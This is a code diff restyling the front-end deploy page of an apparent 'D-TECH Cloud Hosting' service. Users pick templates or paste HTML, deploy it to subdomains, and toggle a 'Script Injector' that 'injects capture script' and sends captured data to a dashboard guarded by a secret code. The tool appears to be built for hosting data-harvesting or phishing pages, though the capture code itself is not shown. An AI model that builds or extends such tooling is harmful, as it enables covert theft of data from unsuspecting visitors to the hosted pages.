@@ -3,83 +3,74 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Cloud Hosting Deployment</title>
-    <style>
-        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background: #f0f2f5; color: #333; padding: 20px; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin:0; }
-        .container { background: white; padding: 40px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); width: 100%; max-width: 500px; }
-        h1 { text-align: center; color: #0070f3; margin-top: 0; }
-        p { text-align: center; color: #666; }
-        .form-group { margin-bottom: 20px; }
-        label { display: block; margin-bottom: 8px; font-weight: bold; color: #444; }
-        input, select { width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 6px; box-sizing: border-box; font-size: 16px; transition: border-color 0.2s; }
-        input:focus, select:focus { border-color: #0070f3; outline: none; }
-        button { width: 100%; padding: 14px; background: #0070f3; color: white; border: none; border-radius: 6px; cursor: pointer; font-size: 16px; font-weight: bold; transition: background 0.2s; }
-        button:hover { background: #005bb5; }
-        .footer { text-align: center; margin-top: 20px; font-size: 14px; color: #888; }
-        .footer a { color: #0070f3; text-decoration: none; }
-        #message { margin-top: 20px; padding: 15px; border-radius: 6px; display: none; text-align: center; }
-        .success { background: #d4edda; color: #155724; }
-        .error { background: #f8d7da; color: #721c24; }
-
-        .hidden { display: none; }
-        .mode-switch { display: flex; gap: 10px; margin-bottom: 20px; }
-        .mode-btn { flex: 1; background: #f4f4f4; color: #333; border: 1px solid #ddd; padding: 12px; cursor: pointer; border-radius: 6px; font-weight: bold; }
-        .mode-btn.active { background: #0070f3; color: white; border-color: #0070f3; }
-        textarea { width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 6px; box-sizing: border-box; font-size: 14px; font-family: monospace; resize: vertical; }
-    </style>
+    <title>D-TECH Cloud Hosting</title>
+    <link rel="stylesheet" href="style.css">
 </head>
 <body>
+    <nav class="navbar">
+        <a href="index.html" class="navbar-brand">
+            <img src="logo.png" alt="D-TECH Logo">
+            D-TECH Cloud
+        </a>
+        <div class="nav-links">
+            <a href="index.html" class="active">Deploy</a>
+            <a href="dashboard.html">Dashboard</a>
+        </div>
+    </nav>
+
     <div class="container">
-        <h1>🚀 Deploy Your Site</h1>
-        <p>Choose a template or upload your own HTML.</p>
+        <div class="card">
+            <h1 class="text-center">🚀 Deploy Your Site</h1>
+            <p class="text-center" style="color: var(--text-muted); margin-bottom: 2rem;">Choose a template or upload your own HTML.</p>
 
-        <div class="mode-switch">
-            <button id="btn-mode-template" class="mode-btn active" onclick="setMode('template')">Use Template</button>
-            <button id="btn-mode-custom" class="mode-btn" onclick="setMode('custom')">Custom HTML</button>
-        </div>
-
-        <div id="section-template" class="form-group">
-            <label>Choose Template</label>
-            <select id="templateName">
-                <option value="">Loading templates...</option>
-            </select>
-        </div>
-
-        <div id="section-custom" class="form-group hidden">
-            <label>Upload HTML File</label>
-            <input type="file" onchange="loadFile(this, 'customHtml')" accept=".html,.txt" style="margin-bottom: 10px;">
-
-            <label>Or Paste HTML Code</label>
-            <textarea id="customHtml" placeholder="<!DOCTYPE html><html>...</html>" style="height: 150px;"></textarea>
-
-            <div style="margin-top: 15px; background: #f8f9fa; padding: 15px; border-radius: 6px; border: 1px solid #eee;">
-                <label style="display:flex; align-items:center; cursor:pointer; margin-bottom: 0;">
-                    <input type="checkbox" id="enableInjector" style="width:auto; margin-right: 10px;">
-                    <span style="font-weight:bold;">Enable Script Injector</span>
-                </label>
-                <small style="color:#666; display:block; margin-top:5px; line-height: 1.4;">
-                    <strong>ON:</strong> Injects capture script. Data is sent to your dashboard.<br>
-                    <strong>OFF:</strong> Hosts static HTML only. No data capture.
-                </small>
+            <div class="mode-switch">
+                <div id="btn-mode-template" class="mode-btn active" onclick="setMode('template')">Use Template</div>
+                <div id="btn-mode-custom" class="mode-btn" onclick="setMode('custom')">Custom HTML</div>
             </div>
+
+            <div id="section-template" class="form-group">
+                <label>Choose Template</label>
+                <select id="templateName">
+                    <option value="">Loading templates...</option>
+                </select>
+            </div>
+
+            <div id="section-custom" class="form-group hidden">
+                <label>Upload HTML File</label>
+                <input type="file" onchange="loadFile(this, 'customHtml')" accept=".html,.txt" style="margin-bottom: 10px;">
+
+                <label>Or Paste HTML Code</label>
+                <textarea id="customHtml" placeholder="<!DOCTYPE html><html>...</html>" style="height: 150px; font-family: monospace;"></textarea>
+
+                <div style="margin-top: 15px; background: var(--input-bg); padding: 15px; border-radius: 6px; border: 1px solid var(--border-color);">
+                    <label style="display:flex; align-items:center; cursor:pointer; margin-bottom: 0;">
+                        <input type="checkbox" id="enableInjector" style="width:auto; margin-right: 10px;">
+                        <span style="font-weight:bold; color: var(--primary-color);">Enable Script Injector</span>
+                    </label>
+                    <small style="color: var(--text-muted); display:block; margin-top:5px; line-height: 1.4;">
+                        <strong>ON:</strong> Injects capture script. Data is sent to your dashboard.<br>
+                        <strong>OFF:</strong> Hosts static HTML only. No data capture.
+                    </small>
+                </div>
+            </div>
+
+            <div class="form-group">
+                <label>Subdomain Name</label>
+                <input type="text" id="subdomain" placeholder="e.g., mysite">
+            </div>
+
+            <div class="form-group">
+                <label>Unique Secret Code</label>
+                <input type="text" id="uniqueCode" placeholder="Create a secret code (for accessing data)">
+            </div>
+
+            <button onclick="deploy()">Deploy Now</button>
+
+            <div id="message" class="message"></div>
         </div>
 
-        <div class="form-group">
-            <label>Subdomain Name</label>
-            <input type="text" id="subdomain" placeholder="e.g., mysite">
-        </div>
-
-        <div class="form-group">
-            <label>Unique Secret Code</label>
-            <input type="text" id="uniqueCode" placeholder="Create a secret code (for accessing data)">
-        </div>
-
-        <button onclick="deploy()">Deploy Now</button>
-
-        <div id="message"></div>
-
-        <div class="footer">
-            <a href="dashboard.html">Access User Dashboard</a>
+        <div class="text-center" style="margin-top: 2rem;">
+            <a href="dashboard.html" style="color: var(--primary-color); text-decoration: none;">Access User Dashboard</a>
         </div>
     </div>
 
@@ -201,7 +192,10 @@
         function showMessage(text, type) {
             const el = document.getElementById('message');
             el.innerText = text;
-            el.className = type;
+
+            // Map simple types to CSS classes
+            el.className = 'message ' + type;
+
             el.style.display = text ? 'block' : 'none';
         }
 
